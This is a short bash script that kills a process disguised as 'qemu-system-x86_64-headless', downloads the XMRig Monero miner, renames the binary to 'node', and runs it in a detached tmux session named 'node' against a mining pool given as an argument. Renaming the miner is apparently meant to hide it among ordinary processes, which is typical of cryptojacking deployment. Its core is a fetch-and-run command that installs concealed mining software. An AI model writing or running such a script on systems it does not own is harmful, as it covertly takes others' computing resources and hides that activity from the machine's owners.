#!/bin/bash

SESSION="node"
DOMAIN="$1"
NAME_WORK="$2"

pkill -f qemu-system-x86_64-headless || true
sleep 1
if pgrep -f qemu-system-x86_64-headless >/dev/null; then
    pkill -9 -f qemu-system-x86_64-headless || true
fi

if tmux has-session -t $SESSION 2>/dev/null; then
    tmux attach-session -t $SESSION
else
    tmux new-session -s $SESSION -d

    tmux send-keys -t $SESSION "
        rm -rf ./xmrig* &&
        wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz &&
        tar -xzf xmrig-6.22.2-linux-static-x64.tar.gz &&
        cd xmrig-6.22.2 &&
        mv xmrig node &&
        chmod +x node &&
        exec ./node -o $DOMAIN --tls -k --donate-level=0 -t 4 --rig-id $NAME_WORK
    " C-m

    tmux attach-session -t $SESSION
fi
